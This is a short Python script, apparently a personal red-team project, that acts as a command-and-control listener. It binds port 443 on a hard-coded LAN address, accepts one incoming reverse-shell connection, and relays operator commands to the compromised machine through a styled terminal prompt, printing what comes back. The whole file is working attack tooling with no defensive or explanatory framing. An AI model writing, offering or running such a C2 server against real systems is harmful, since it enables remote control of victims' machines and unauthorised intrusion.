#!/usr/bin/env python3
import socket, os, subprocess, signal, sys
from termcolor import colored

# Ctrl + C

def ctrl_c(sig, frame):
	print(colored("\n\n\t[!] Quiting...\n\n", "red"))
	sys.exit(1)

signal.signal(signal.SIGINT, ctrl_c)

# Global Vars

actual_ip = subprocess.check_output("hostname -I | awk '{print $1}'", shell=True).decode().strip()
hostname = subprocess.check_output("hostname", shell=True).decode().strip()
username = subprocess.check_output("whoami", shell=True).decode().strip()

# C2 

if __name__ == "__main__":

	host = actual_ip
	port = 443

	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as c2_socket:
		c2_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		c2_socket.bind(("192.168.1.34", 443))
		c2_socket.listen()

		print("\n\t[+] Listening for incomming connections...")

		client_socket, client_addr = c2_socket.accept()
		print(f"\n\n\t[!] Connection from {client_addr[0]}:{client_addr[1]}\n\n")

		while True:
			cmd = input(f"""
{colored('┌──(','blue')}{colored(f'{username}㉿{hostname}', 'green')}{colored(')-[','blue')}~/Dobliuw/C&C{colored(']','blue')}
{colored('└─','blue')}{colored('$', 'yellow')} """)
			client_socket.sendall(cmd.encode())
			stdout = client_socket.recv(1024).decode()
			if cmd in stdout and 'Error:' in stdout:
				print(colored(stdout, 'red'))
			else:
				print(stdout)

